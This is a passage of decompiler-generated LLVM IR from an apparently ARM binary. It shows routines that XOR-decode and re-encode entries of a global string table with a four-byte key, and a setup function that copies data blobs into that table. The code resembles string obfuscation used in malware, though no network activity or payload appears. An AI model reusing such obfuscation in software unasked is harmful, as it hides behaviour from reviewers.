  uselistorder i32* @r6, { 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 194, 195, 24, 23, 25, 26, 27, 28, 29, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 176, 177, 178, 0, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 1, 46, 47, 48, 49, 50, 11, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 10, 61, 62, 63, 2, 64, 65, 66, 3, 67, 4, 68, 5, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 216, 219, 217, 218, 220, 221, 12, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 6, 237, 238, 239, 240, 241, 242, 244, 7, 243, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 8, 9, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290 }
  uselistorder i32* @r5, { 17, 18, 344, 345, 346, 347, 348, 349, 19, 350, 46, 351, 352, 353, 2, 1, 354, 355, 20, 21, 22, 23, 24, 47, 14, 15, 16, 50, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 51, 52, 53, 54, 48, 49, 356, 357, 358, 359, 360, 55, 361, 362, 9, 363, 364, 365, 366, 367, 368, 369, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 3, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 0, 103, 104, 105, 106, 107, 108, 11, 109, 110, 111, 112, 113, 114, 115, 116, 12, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 370, 371, 372, 373, 374, 375, 376, 377, 379, 380, 378, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 7, 418, 419, 420, 421, 422, 423, 424, 10, 425, 426, 4, 427, 428, 5, 429, 430, 6, 431, 432, 433, 434, 435, 436, 13, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 8, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479 }
  uselistorder label %dec_label_pc_1303c, { 1, 0 }
  uselistorder label %dec_label_pc_12ecc, { 1, 0 }
  uselistorder label %dec_label_pc_12e38, { 2, 0, 1 }
  uselistorder label %bb348, { 1, 0 }
  uselistorder label %dec_label_pc_12df8, { 1, 0 }
  uselistorder label %dec_label_pc_12cc4, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_12cb0, { 1, 0 }
  uselistorder label %dec_label_pc_12c58, { 2, 3, 1, 11, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder label %dec_label_pc_12c3c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12ab8, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_12aa4, { 1, 0 }
  uselistorder label %dec_label_pc_12a04, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_129f0, { 1, 0 }
  uselistorder label %dec_label_pc_12950, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_1293c, { 1, 0 }
  uselistorder label %dec_label_pc_1289c, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_12888, { 1, 0 }
  uselistorder label %dec_label_pc_12810, { 1, 0 }
  uselistorder label %dec_label_pc_12804, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_127f0, { 1, 0 }
  uselistorder label %dec_label_pc_12774, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_12760, { 1, 0 }
  uselistorder label %dec_label_pc_12618, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_12608, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %bb322, { 2, 1, 0 }
  uselistorder label %bb319, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12568, { 1, 0 }
  uselistorder label %dec_label_pc_12568.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_124f0, { 1, 0 }
  uselistorder label %bb316, { 1, 0 }
  uselistorder label %dec_label_pc_124a0, { 1, 0 }
  uselistorder label %dec_label_pc_12490, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12488thread-pre-split, { 4, 5, 3, 7, 2, 6, 1, 8, 0, 9 }
  uselistorder label %dec_label_pc_12488thread-pre-split.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_12490.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_12484.loopexit, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_12444, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12320, { 6, 7, 3, 4, 0, 5, 1, 2 }
  uselistorder label %dec_label_pc_122fc, { 1, 0 }
  uselistorder label %bb311, { 1, 0 }
  uselistorder label %bb309, { 1, 2, 3, 0, 5, 4 }
  uselistorder label %dec_label_pc_12164.dec_label_pc_12164_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_12148.dec_label_pc_12148_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_12140, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12138, { 1, 0 }
  uselistorder label %dec_label_pc_120ec, { 1, 0 }
  uselistorder label %dec_label_pc_11f8c, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_11f80, { 1, 0 }
  uselistorder label %.thread48, { 2, 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %dec_label_pc_11de4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11dc0, { 1, 0 }
  uselistorder label %dec_label_pc_11db4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11d90, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11d6c, { 1, 0 }
  uselistorder label %bb281, { 1, 0 }
  uselistorder label %dec_label_pc_11d18, { 22, 6, 7, 2, 8, 3, 9, 4, 10, 5, 11, 0, 12, 13, 14, 15, 16, 17, 18, 19, 1, 20, 21, 23 }
  uselistorder label %dec_label_pc_117bc, { 1, 0 }
}

define i32 @function_13044(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_13044:
  %v3_13048 = mul i32 %arg1, 8
  %v2_1304c = add i32 %v3_13048, ptrtoint (i32* @global_var_1ce20.393 to i32)
  %v2_13050 = icmp eq i32* %arg2, null
  br i1 %v2_13050, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_13044
  %v3_1305c11 = inttoptr i32 %v2_1304c to i32*
  %v4_1305c12 = load i32, i32* %v3_1305c11, align 4
  br label %bb15

bb:                                               ; preds = %dec_label_pc_13044
  %v2_13054 = add i32 %v3_13048, add (i32 ptrtoint (i32* @global_var_1ce20.393 to i32), i32 5)
  %v3_13054 = inttoptr i32 %v2_13054 to i8*
  %v4_13054 = load i8, i8* %v3_13054, align 1
  %v5_13054 = zext i8 %v4_13054 to i32
  %v2_13058 = add i32 %v3_13048, add (i32 ptrtoint (i32* @global_var_1ce20.393 to i32), i32 4)
  %v3_13058 = inttoptr i32 %v2_13058 to i8*
  %v4_13058 = load i8, i8* %v3_13058, align 4
  %v5_13058 = zext i8 %v4_13058 to i32
  %v3_1305c = inttoptr i32 %v2_1304c to i32*
  %v4_1305c = load i32, i32* %v3_1305c, align 4
  %v5_13060 = mul nuw nsw i32 %v5_13054, 256
  %v6_13060 = or i32 %v5_13058, %v5_13060
  store i32 %v6_13060, i32* %arg2, align 4
  br label %bb15

bb15:                                             ; preds = %.thread, %bb
  %v4_1305c714 = phi i32 [ %v4_1305c12, %.thread ], [ %v4_1305c, %bb ]
  ret i32 %v4_1305c714

; uselistorder directives
  uselistorder i32 %v2_1304c, { 1, 0 }
  uselistorder i32 %v3_13048, { 2, 1, 0 }
  uselistorder i32* null, { 2, 7, 3, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 18, 19, 20, 1, 4, 21, 6, 22, 23, 24, 31, 25, 26, 27, 28, 29, 30, 5, 32 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @function_13070(i32 %arg1) local_unnamed_addr {
dec_label_pc_13070:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13070 = mul i32 %arg1, 8
  %v3_13074 = load i32, i32* @r4, align 4
  store i32 %v3_13074, i32* %stack_var_-20, align 4
  %v3_13084 = and i32 %v3_13070, 2040
  %v2_13088 = add i32 %v3_13084, ptrtoint (i32* @global_var_1ce20.393 to i32)
  store i32 %v2_13088, i32* %lr.global-to-local, align 4
  %v1_13090 = add i32 %v3_13084, add (i32 ptrtoint (i32* @global_var_1ce20.393 to i32), i32 4)
  store i32 %v1_13090, i32* %r7.global-to-local, align 4
  %v2_13094 = load i32, i32* @global_var_1cd5c.396, align 4
  %v2_13098 = inttoptr i32 %v1_13090 to i8*
  %v3_13098 = load i8, i8* %v2_13098, align 4
  %v4_13098 = zext i8 %v3_13098 to i32
  store i32 %v4_13098, i32* @r1, align 4
  %v1_1309c = add i32 %v3_13084, add (i32 ptrtoint (i32* @global_var_1ce20.393 to i32), i32 5)
  %v2_1309c = inttoptr i32 %v1_1309c to i8*
  %v3_1309c = load i8, i8* %v2_1309c, align 1
  %v4_1309c = zext i8 %v3_1309c to i32
  %v3_130a0 = udiv i32 %v2_13094, 256
  %v4_130a4 = mul nuw nsw i32 %v4_1309c, 256
  %v5_130a4 = or i32 %v4_130a4, %v4_13098
  %v7_130a4 = icmp eq i32 %v5_130a4, 0
  store i1 %v7_130a4, i1* @cpsr_z, align 1
  %v3_130a8 = udiv i32 %v2_13094, 65536
  %v1_130ac = urem i32 %v3_130a0, 256
  store i32 %v1_130ac, i32* %r6.global-to-local, align 4
  %v1_130b0 = urem i32 %v3_130a8, 256
  store i32 %v1_130b0, i32* %r5.global-to-local, align 4
  %v3_130b4 = udiv i32 %v2_13094, 16777216
  store i32 %v3_130b4, i32* %r4.global-to-local, align 4
  %v1_130b8 = urem i32 %v2_13094, 256
  br i1 %v7_130a4, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_13070
  store i32 %v3_13074, i32* @r4, align 4
  ret i32 %v1_130b8

bb8:                                              ; preds = %dec_label_pc_13070
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_130c4

dec_label_pc_130c4:                               ; preds = %dec_label_pc_130c4, %bb8
  %v2_130d0 = phi i32 [ %v1_1310c, %dec_label_pc_130c4 ], [ 0, %bb8 ]
  %v0_130c4 = phi i32 [ %v0_13104, %dec_label_pc_130c4 ], [ %v2_13088, %bb8 ]
  %v1_130c4 = inttoptr i32 %v0_130c4 to i32*
  %v2_130c4 = load i32, i32* %v1_130c4, align 4
  %v2_130c8 = add i32 %v2_130c4, %v2_130d0
  %v3_130c8 = inttoptr i32 %v2_130c8 to i8*
  %v4_130c8 = load i8, i8* %v3_130c8, align 1
  %v6_130c8 = zext i8 %v4_130c8 to i32
  %v2_130cc = xor i32 %v6_130c8, %v1_130b8
  %v1_130d0 = trunc i32 %v2_130cc to i8
  store i8 %v1_130d0, i8* %v3_130c8, align 1
  %v0_130d4 = load i32, i32* %lr.global-to-local, align 4
  %v1_130d4 = inttoptr i32 %v0_130d4 to i32*
  %v2_130d4 = load i32, i32* %v1_130d4, align 4
  %v0_130d8 = load i32, i32* %ip.global-to-local, align 4
  %v2_130d8 = add i32 %v0_130d8, %v2_130d4
  %v3_130d8 = inttoptr i32 %v2_130d8 to i8*
  %v4_130d8 = load i8, i8* %v3_130d8, align 1
  %v6_130d8 = zext i8 %v4_130d8 to i32
  %v0_130dc = load i32, i32* %r6.global-to-local, align 4
  %v2_130dc = xor i32 %v0_130dc, %v6_130d8
  %v1_130e0 = trunc i32 %v2_130dc to i8
  store i8 %v1_130e0, i8* %v3_130d8, align 1
  %v0_130e4 = load i32, i32* %lr.global-to-local, align 4
  %v1_130e4 = inttoptr i32 %v0_130e4 to i32*
  %v2_130e4 = load i32, i32* %v1_130e4, align 4
  %v0_130e8 = load i32, i32* %ip.global-to-local, align 4
  %v2_130e8 = add i32 %v0_130e8, %v2_130e4
  %v3_130e8 = inttoptr i32 %v2_130e8 to i8*
  %v4_130e8 = load i8, i8* %v3_130e8, align 1
  %v6_130e8 = zext i8 %v4_130e8 to i32
  %v0_130ec = load i32, i32* %r5.global-to-local, align 4
  %v2_130ec = xor i32 %v0_130ec, %v6_130e8
  %v1_130f0 = trunc i32 %v2_130ec to i8
  store i8 %v1_130f0, i8* %v3_130e8, align 1
  %v0_130f4 = load i32, i32* %lr.global-to-local, align 4
  %v1_130f4 = inttoptr i32 %v0_130f4 to i32*
  %v2_130f4 = load i32, i32* %v1_130f4, align 4
  store i32 %v2_130f4, i32* @r1, align 4
  %v0_130f8 = load i32, i32* %ip.global-to-local, align 4
  %v2_130f8 = add i32 %v0_130f8, %v2_130f4
  %v3_130f8 = inttoptr i32 %v2_130f8 to i8*
  %v4_130f8 = load i8, i8* %v3_130f8, align 1
  %v6_130f8 = zext i8 %v4_130f8 to i32
  %v0_130fc = load i32, i32* %r4.global-to-local, align 4
  %v2_130fc = xor i32 %v0_130fc, %v6_130f8
  %v1_13100 = trunc i32 %v2_130fc to i8
  store i8 %v1_13100, i8* %v3_130f8, align 1
  %v0_13104 = load i32, i32* %lr.global-to-local, align 4
  %v1_13104 = add i32 %v0_13104, 4
  %v2_13104 = inttoptr i32 %v1_13104 to i8*
  %v3_13104 = load i8, i8* %v2_13104, align 1
  %v4_13104 = zext i8 %v3_13104 to i32
  %v0_13108 = load i32, i32* %r7.global-to-local, align 4
  %v1_13108 = add i32 %v0_13108, 1
  %v2_13108 = inttoptr i32 %v1_13108 to i8*
  %v3_13108 = load i8, i8* %v2_13108, align 1
  %v4_13108 = zext i8 %v3_13108 to i32
  %v0_1310c = load i32, i32* %ip.global-to-local, align 4
  %v1_1310c = add i32 %v0_1310c, 1
  store i32 %v1_1310c, i32* %ip.global-to-local, align 4
  %v4_13110 = mul nuw nsw i32 %v4_13108, 256
  %v5_13110 = or i32 %v4_13110, %v4_13104
  %v9_13114 = icmp eq i32 %v5_13110, %v1_1310c
  store i1 %v9_13114, i1* @cpsr_z, align 1
  %v8_13118 = icmp sgt i32 %v5_13110, %v1_1310c
  br i1 %v8_13118, label %dec_label_pc_130c4, label %dec_label_pc_1311c

dec_label_pc_1311c:                               ; preds = %dec_label_pc_130c4
  %v2_1311c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1311c, i32* @r4, align 4
  ret i32 %v1_130b8

; uselistorder directives
  uselistorder i32 %v1_1310c, { 1, 2, 3, 0 }
  uselistorder i32 %v0_13104, { 1, 0 }
  uselistorder i32 %v1_130b8, { 1, 2, 0 }
  uselistorder i32 %v2_13094, { 3, 0, 1, 2 }
}

define i32 @function_13128(i32 %arg1) local_unnamed_addr {
dec_label_pc_13128:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13128 = mul i32 %arg1, 8
  %v3_1312c = load i32, i32* @r4, align 4
  store i32 %v3_1312c, i32* %stack_var_-20, align 4
  %v3_1313c = and i32 %v3_13128, 2040
  %v2_13140 = add i32 %v3_1313c, ptrtoint (i32* @global_var_1ce20.393 to i32)
  store i32 %v2_13140, i32* %lr.global-to-local, align 4
  %v1_13148 = add i32 %v3_1313c, add (i32 ptrtoint (i32* @global_var_1ce20.393 to i32), i32 4)
  store i32 %v1_13148, i32* %r7.global-to-local, align 4
  %v2_1314c = load i32, i32* @global_var_1cd5c.396, align 4
  %v2_13150 = inttoptr i32 %v1_13148 to i8*
  %v3_13150 = load i8, i8* %v2_13150, align 4
  %v4_13150 = zext i8 %v3_13150 to i32
  %v1_13154 = add i32 %v3_1313c, add (i32 ptrtoint (i32* @global_var_1ce20.393 to i32), i32 5)
  %v2_13154 = inttoptr i32 %v1_13154 to i8*
  %v3_13154 = load i8, i8* %v2_13154, align 1
  %v4_13154 = zext i8 %v3_13154 to i32
  %v3_13158 = udiv i32 %v2_1314c, 256
  %v4_1315c = mul nuw nsw i32 %v4_13154, 256
  %v5_1315c = or i32 %v4_1315c, %v4_13150
  %v7_1315c = icmp eq i32 %v5_1315c, 0
  %v3_13160 = udiv i32 %v2_1314c, 65536
  %v1_13164 = urem i32 %v3_13158, 256
  store i32 %v1_13164, i32* %r6.global-to-local, align 4
  %v1_13168 = urem i32 %v3_13160, 256
  store i32 %v1_13168, i32* %r5.global-to-local, align 4
  %v3_1316c = udiv i32 %v2_1314c, 16777216
  store i32 %v3_1316c, i32* %r4.global-to-local, align 4
  %v1_13170 = urem i32 %v2_1314c, 256
  br i1 %v7_1315c, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_13128
  store i32 %v3_1312c, i32* @r4, align 4
  ret i32 %v1_13170

bb8:                                              ; preds = %dec_label_pc_13128
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1317c

dec_label_pc_1317c:                               ; preds = %dec_label_pc_1317c, %bb8
  %v2_13188 = phi i32 [ %v1_131c4, %dec_label_pc_1317c ], [ 0, %bb8 ]
  %v0_1317c = phi i32 [ %v0_131bc, %dec_label_pc_1317c ], [ %v2_13140, %bb8 ]
  %v1_1317c = inttoptr i32 %v0_1317c to i32*
  %v2_1317c = load i32, i32* %v1_1317c, align 4
  %v2_13180 = add i32 %v2_1317c, %v2_13188
  %v3_13180 = inttoptr i32 %v2_13180 to i8*
  %v4_13180 = load i8, i8* %v3_13180, align 1
  %v6_13180 = zext i8 %v4_13180 to i32
  %v2_13184 = xor i32 %v6_13180, %v1_13170
  %v1_13188 = trunc i32 %v2_13184 to i8
  store i8 %v1_13188, i8* %v3_13180, align 1
  %v0_1318c = load i32, i32* %lr.global-to-local, align 4
  %v1_1318c = inttoptr i32 %v0_1318c to i32*
  %v2_1318c = load i32, i32* %v1_1318c, align 4
  %v0_13190 = load i32, i32* %ip.global-to-local, align 4
  %v2_13190 = add i32 %v0_13190, %v2_1318c
  %v3_13190 = inttoptr i32 %v2_13190 to i8*
  %v4_13190 = load i8, i8* %v3_13190, align 1
  %v6_13190 = zext i8 %v4_13190 to i32
  %v0_13194 = load i32, i32* %r6.global-to-local, align 4
  %v2_13194 = xor i32 %v0_13194, %v6_13190
  %v1_13198 = trunc i32 %v2_13194 to i8
  store i8 %v1_13198, i8* %v3_13190, align 1
  %v0_1319c = load i32, i32* %lr.global-to-local, align 4
  %v1_1319c = inttoptr i32 %v0_1319c to i32*
  %v2_1319c = load i32, i32* %v1_1319c, align 4
  %v0_131a0 = load i32, i32* %ip.global-to-local, align 4
  %v2_131a0 = add i32 %v0_131a0, %v2_1319c
  %v3_131a0 = inttoptr i32 %v2_131a0 to i8*
  %v4_131a0 = load i8, i8* %v3_131a0, align 1
  %v6_131a0 = zext i8 %v4_131a0 to i32
  %v0_131a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_131a4 = xor i32 %v0_131a4, %v6_131a0
  %v1_131a8 = trunc i32 %v2_131a4 to i8
  store i8 %v1_131a8, i8* %v3_131a0, align 1
  %v0_131ac = load i32, i32* %lr.global-to-local, align 4
  %v1_131ac = inttoptr i32 %v0_131ac to i32*
  %v2_131ac = load i32, i32* %v1_131ac, align 4
  %v0_131b0 = load i32, i32* %ip.global-to-local, align 4
  %v2_131b0 = add i32 %v0_131b0, %v2_131ac
  %v3_131b0 = inttoptr i32 %v2_131b0 to i8*
  %v4_131b0 = load i8, i8* %v3_131b0, align 1
  %v6_131b0 = zext i8 %v4_131b0 to i32
  %v0_131b4 = load i32, i32* %r4.global-to-local, align 4
  %v2_131b4 = xor i32 %v0_131b4, %v6_131b0
  %v1_131b8 = trunc i32 %v2_131b4 to i8
  store i8 %v1_131b8, i8* %v3_131b0, align 1
  %v0_131bc = load i32, i32* %lr.global-to-local, align 4
  %v1_131bc = add i32 %v0_131bc, 4
  %v2_131bc = inttoptr i32 %v1_131bc to i8*
  %v3_131bc = load i8, i8* %v2_131bc, align 1
  %v4_131bc = zext i8 %v3_131bc to i32
  %v0_131c0 = load i32, i32* %r7.global-to-local, align 4
  %v1_131c0 = add i32 %v0_131c0, 1
  %v2_131c0 = inttoptr i32 %v1_131c0 to i8*
  %v3_131c0 = load i8, i8* %v2_131c0, align 1
  %v4_131c0 = zext i8 %v3_131c0 to i32
  %v0_131c4 = load i32, i32* %ip.global-to-local, align 4
  %v1_131c4 = add i32 %v0_131c4, 1
  store i32 %v1_131c4, i32* %ip.global-to-local, align 4
  %v4_131c8 = mul nuw nsw i32 %v4_131c0, 256
  %v5_131c8 = or i32 %v4_131c8, %v4_131bc
  %v8_131d0 = icmp sgt i32 %v5_131c8, %v1_131c4
  br i1 %v8_131d0, label %dec_label_pc_1317c, label %dec_label_pc_131d4

dec_label_pc_131d4:                               ; preds = %dec_label_pc_1317c
  %v2_131d4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_131d4, i32* @r4, align 4
  ret i32 %v1_13170

; uselistorder directives
  uselistorder i32 %v1_131c4, { 1, 2, 0 }
  uselistorder i32 %v0_131bc, { 1, 0 }
  uselistorder i32 %v1_13170, { 0, 2, 1 }
  uselistorder i32 %v2_1314c, { 3, 0, 1, 2 }
  uselistorder i32 16777216, { 1, 2, 5, 3, 6, 4, 8, 7, 12, 9, 11, 10, 13, 0, 15, 14, 17, 16, 19, 18, 20, 21, 29, 22, 30, 23, 31, 24, 32, 33, 25, 34, 26, 35, 27, 36, 28, 38, 37, 42, 39, 43, 40, 44, 41, 47, 45, 48, 46, 49, 51, 50, 52, 56, 53, 57, 58, 54, 59, 55, 60, 62, 61, 63, 64, 66, 65, 67, 71, 68, 72, 69, 73, 70, 75, 74, 76, 78, 77, 83, 79, 84, 85, 80, 86, 81, 87, 82, 88, 91, 92, 89, 93, 90, 94, 96, 95, 101, 97, 102, 98, 103, 99, 100, 104, 106, 105, 113, 107, 114, 115, 108, 116, 111, 117, 109, 118, 119, 110, 112, 120, 122, 121, 126, 123, 127, 128, 124, 125, 129, 130, 131, 133, 132, 136, 134, 137, 135, 138, 140, 141, 139, 142 }
}

define i32 @function_131e0() local_unnamed_addr {
dec_label_pc_131e0:
  %fp.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_131e0 = load i32, i32* @r4, align 4
  store i32 %v3_131e0, i32* %stack_var_-36, align 4
  %v1_131e8 = call i32 @_malloc(i32 18)
  store i32 ptrtoint ([19 x i8]* @global_var_14660.400 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ce20.393 to i32), i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_131e8, i32* %r5.global-to-local, align 4
  %v4_13204 = call i32 @function_13ad0(i32 %v1_131e8, i32 ptrtoint ([19 x i8]* @global_var_14660.400 to i32), i32 18)
  store i32 18, i32* %r3.global-to-local, align 4
  store i8 18, i8* bitcast (i32* @global_var_1ce3c.402 to i8*), align 4
  %v0_13214 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13214, i32* @global_var_1ce38.403, align 4
  %v0_13218 = load i32, i32* %r6.global-to-local, align 4
  %v1_13218 = trunc i32 %v0_13218 to i8
  store i8 %v1_13218, i8* bitcast (i32* @global_var_1ce3d.404 to i8*), align 4
  %v1_1321c = call i32 @_malloc(i32 2)
  store i32 2, i32* %r5.global-to-local, align 4
  store i32 %v1_1321c, i32* %r7.global-to-local, align 4
  %v4_13230 = call i32 @function_13ad0(i32 %v1_1321c, i32 ptrtoint ([3 x i8]* @global_var_14674.406 to i32), i32 2)
  %v0_13238 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_13238, i32* @global_var_1ce40.407, align 4
  %v0_1323c = load i32, i32* %r5.global-to-local, align 4
  %v1_1323c = trunc i32 %v0_1323c to i8
  store i8 %v1_1323c, i8* bitcast (i32* @global_var_1ce44.408 to i8*), align 4
  %v0_13240 = load i32, i32* %r6.global-to-local, align 4
  %v1_13240 = trunc i32 %v0_13240 to i8
  store i8 %v1_13240, i8* bitcast (i32* @global_var_1ce45.409 to i8*), align 4
  %v1_13244 = call i32 @_malloc(i32 18)
  %v0_13248 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v1_13244, i32* %r7.global-to-local, align 4
  %v4_13254 = call i32 @function_13ad0(i32 %v1_13244, i32 %v0_13248, i32 18)
  store i32 18, i32* %r3.global-to-local, align 4
  %v0_1325c = load i32, i32* %r5.global-to-local, align 4
  store i8 18, i8* bitcast (i32* @global_var_1ceb4.410 to i8*), align 4
  %v0_13264 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_13264, i32* @global_var_1ceb0.411, align 4
  %v0_13268 = load i32, i32* %r6.global-to-local, align 4
  %v1_13268 = trunc i32 %v0_13268 to i8
  store i8 %v1_13268, i8* bitcast (i32* @global_var_1ceb5.412 to i8*), align 4
  %v1_1326c = call i32 @_malloc(i32 %v0_1325c)
  %v0_13270 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_1326c, i32* %r7.global-to-local, align 4
  %v3_1327c = call i32 @function_13ad0(i32 %v1_1326c, i32 ptrtoint (i32* @global_var_14678.414 to i32), i32 %v0_13270)
  %v0_13284 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_13284, i32* @global_var_1ceb8.415, align 4
  %v0_13288 = load i32, i32* %r5.global-to-local, align 4
  %v1_13288 = trunc i32 %v0_13288 to i8
  store i8 %v1_13288, i8* bitcast (i32* @global_var_1cebc.416 to i8*), align 4
  %v0_1328c = load i32, i32* %r6.global-to-local, align 4
  %v1_1328c = trunc i32 %v0_1328c to i8
  store i8 %v1_1328c, i8* bitcast (i32* @global_var_1cebd.417 to i8*), align 4
  %v1_13290 = call i32 @_malloc(i32 15)
  store i32 %v1_13290, i32* %r5.global-to-local, align 4
  %v3_132a0 = call i32 @function_13ad0(i32 %v1_13290, i32 ptrtoint (i32* @global_var_1467c.419 to i32), i32 15)
  store i32 15, i32* %r3.global-to-local, align 4
  store i8 15, i8* bitcast (i32* @global_var_1ce34.420 to i8*), align 4
  %v0_132b0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_132b0, i32* @global_var_1ce30.421, align 4
  %v0_132b4 = load i32, i32* %r6.global-to-local, align 4
  %v1_132b4 = trunc i32 %v0_132b4 to i8
  store i8 %v1_132b4, i8* bitcast (i32* @global_var_1ce35.422 to i8*), align 4
  %v1_132b8 = call i32 @_malloc(i32 29)
